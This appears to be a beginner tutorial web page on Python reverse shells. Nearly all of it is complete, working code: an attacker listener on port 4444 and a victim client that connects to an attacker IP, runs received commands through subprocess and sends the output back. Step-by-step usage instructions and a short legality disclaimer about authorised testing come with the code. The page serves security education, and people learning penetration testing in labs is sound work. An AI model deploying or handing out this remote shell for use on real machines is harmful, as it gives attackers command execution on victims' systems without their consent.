Python Reverse Shell - Full Guide for Beginners

A reverse shell is a method used in ethical hacking where a victim's machine connects back to the attacker's system. Once connected, the attacker can send commands to be executed on the victim’s system.

How Does a Reverse Shell Work?

  • The attacker starts a listener to wait for incoming connections.
  • The victim runs a script that connects back to the attacker's IP and port.
  • Once connected, the attacker can send shell commands to the victim system.

Server Side Script (Attacker Machine)

This script runs on the attacker’s machine. It waits for a connection and sends commands:

import socket  # For creating a network connection

host = '0.0.0.0'  # Listen on all network interfaces
port = 4444       # Port to listen on

server_socket = socket.socket()  # Create a socket object
server_socket.bind((host, port)) # Bind socket to host and port
server_socket.listen(1)          # Allow only one connection

print(f"Listening on {host}:{port}...")

client_socket, client_address = server_socket.accept()  # Accept incoming connection
print(f"Connection received from {client_address[0]}")

while True:
    command = input("Shell> ")  # Take input from attacker

    if command.strip().lower() == "exit":
        client_socket.send(b"exit")  # Send exit command to close connection
        break

    client_socket.send(command.encode())  # Send the command to the victim
    result = client_socket.recv(4096).decode()  # Receive output from victim
    print(result)  # Print the result

client_socket.close()
server_socket.close()

Client Side Script (Victim Machine)

This script runs on the victim’s machine and connects back to the attacker:

import socket      # For networking
import subprocess  # To run system commands
import os          # To change directories

attacker_ip = '192.168.1.100'  # Replace with the attacker's IP
attacker_port = 4444           # Port number used by attacker

s = socket.socket()  # Create a socket
s.connect((attacker_ip, attacker_port))  # Connect to attacker

while True:
    command = s.recv(1024).decode()  # Receive command from attacker

    if command.lower() == 'exit':
        break  # If command is 'exit', break the loop

    if command.startswith('cd '):  # Handle directory change
        try:
            os.chdir(command[3:])  # Change directory
            s.send(b'Changed directory.\n')
        except FileNotFoundError:
            s.send(b'Directory not found.\n')
        continue

    output = subprocess.getoutput(command)  # Run the command and get output
    s.send(output.encode())  # Send output back to attacker

s.close()  # Close the connection

How to Use This Reverse Shell?

  • Step 1: Set the correct IP and port in the client script.
  • Step 2: Run the server script on the attacker’s machine.
  • Step 3: Run the client script on the target (test) machine.
  • Step 4: If successful, you will get a shell to the victim's system.

Is It Legal?

Reverse shells are legal only when used for:

  • Your own systems
  • Authorized penetration testing with written permission
  • Cybersecurity learning and lab environments (e.g., TryHackMe, HackTheBox)

Important: Using reverse shells on unauthorized systems is illegal and unethical.

Key Concepts You Learned

  • socket – Used to connect client and server
  • subprocess – Runs shell/system commands
  • os.chdir() – Changes the current directory
  • send() and recv() – Used for sending and receiving data between computers

This Python reverse shell example is useful for learning client-server communication and ethical hacking basics. Always use it responsibly and only in legal environments.
